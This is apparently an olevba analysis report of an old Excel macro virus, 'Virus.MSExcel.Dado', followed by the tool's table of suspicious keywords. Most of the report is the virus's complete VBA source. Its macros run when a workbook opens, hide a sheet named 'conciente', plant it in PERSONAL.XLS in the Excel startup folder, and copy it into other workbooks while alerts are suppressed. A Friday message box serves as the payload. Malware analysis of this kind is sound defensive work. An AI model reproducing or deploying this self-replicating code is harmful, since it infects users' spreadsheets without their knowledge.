olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle4.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle5.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle6.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle7.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle8.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle9.cls 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO conciente.bas 
in file: Virus.MSExcel.Dado-cd7165a6a3d4f2faba1113279fbbc02e4c164768 - OLE stream: '_VBA_PROJECT_CUR/VBA/conciente'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_abrir()
Attribute auto_abrir.VB_ProcData.VB_Invoke_Func = " \n14"
'Dado Error IrA terminar1
Application.ScreenUpdating = False
Application.DisplayAlerts = False
infectar
Windows("PERSONAL.XLS").Visible = False
Application.ScreenUpdating = True
Application.DisplayAlerts = True
'BarrasMenús(xlHojaCálculo).Menús("Herramientas").ElementosMenú("Macro...").Eliminar
'BarrasMenús(xlMódulo).Menús("Herramientas").ElementosMenú("Macro...").Eliminar
'BarrasMenús(xlHojaCálculo).Menús("Formato").ElementosMenú("Hoja").ElementosMenú("Mostrar...").Eliminar
'BarrasMenús(xlMódulo).Menús(2).ElementosMenú(11).ElementosMenú(3).Eliminar
'terminar1:
End Sub

Sub auto_cerrar()
Attribute auto_cerrar.VB_ProcData.VB_Invoke_Func = " \n14"
'Dado Error IrA terminar2
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Workbooks(ThisWorkbook.Name).Save
Workbooks("PERSONAL.XLS").Save
Application.ScreenUpdating = True
Application.DisplayAlerts = True
'terminar2:
End Sub

Sub infectar()
Attribute infectar.VB_ProcData.VB_Invoke_Func = " \n14"
'Dado Error IrA terminar
Application.ScreenUpdating = False
Application.DisplayAlerts = False
inst = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
    If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then inst = 1
        If inst = 0 Then
            Workbooks(ThisWorkbook.Name).Sheets("conciente").Visible = True
            Workbooks(ThisWorkbook.Name).Sheets("conciente").Select
            Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\PERSONAL.XLS"
            Workbooks(ThisWorkbook.Name).Sheets("conciente").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
            Workbooks(ThisWorkbook.Name).Sheets("conciente").Visible = False
            GoTo cuentaventanas
        End If
        If inst = 1 Then
            Windows("PERSONAL.XLS").Visible = True
            numhper = Workbooks(ActiveWorkbook.Name).Sheets.Count
            For i = 1 To numhper
                If Workbooks("PERSONAL.XLS").Sheets(i).Name = "conciente" Then
                    inst = 2
                End If
            Next
            If inst = 1 Then
                Windows(ThisWorkbook.Name).Activate
                Workbooks(ThisWorkbook.Name).Sheets("conciente").Visible = True
                Workbooks(ThisWorkbook.Name).Sheets("conciente").Select
                MsgBox (ThisWorkbook.Name)
                Workbooks(ThisWorkbook.Name).Sheets("conciente").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
                Workbooks(ThisWorkbook.Name).Sheets("conciente").Visible = False
                GoTo cuentaventanas
            Else
                GoTo cuentaventanas
            End If
        End If
cuentaventanas:
    Application.Toolbars(1).ToolbarButtons(3).OnAction = "PERSONAL.XLS!contamina"

    End If
    
Workbooks("PERSONAL.XLS").Sheets("conciente").Visible = False
Windows("PERSONAL.XLS").Visible = False
Workbooks("PERSONAL.XLS").Save
Windows(ThisWorkbook.Name).Activate

Application.ScreenUpdating = True
Application.DisplayAlerts = True
If WeekDay(Now) = 6 Then
    Application.OnTime TimeValue("16:30:00"), "vv1"
End If
'terminar:
End Sub

Sub vv1()
Attribute vv1.VB_ProcData.VB_Invoke_Func = " \n14"
MsgBox ("                ¡¡¡ GRACIAS A DIOS ES VIERNES !!! " & Chr(13) & "FAVOR DE APAGAR SU COMPUTADOR Y QUE TENGA UN BUEN FIN DE SEMANA")
End Sub

Sub contamina()
Attribute contamina.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo finish
Application.ScreenUpdating = False
Application.DisplayAlerts = False
    numhojas = ActiveWorkbook.Sheets.Count
    libact = ActiveWorkbook.Name
    For iii = 1 To numhojas
        If ActiveWorkbook.Sheets(iii).Name = "conciente" Then
            inst = 3
        End If
    Next
    If inst <> 3 Then
        Windows("PERSONAL.XLS").Visible = True
        Workbooks("PERSONAL.XLS").Sheets("conciente").Visible = True
        Workbooks(libact).Activate
        Workbooks("PERSONAL.XLS").Sheets("conciente").Copy Before:=ActiveWorkbook.Sheets(1)
        Windows("PERSONAL.XLS").Visible = False
        Workbooks("PERSONAL.XLS").Sheets("conciente").Visible = False
        ActiveWorkbook.Sheets("conciente").Visible = False
        ActiveWorkbook.Save
    Else
        ActiveWorkbook.Save
    End If
Application.ScreenUpdating = True
Application.DisplayAlerts = True
finish:
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

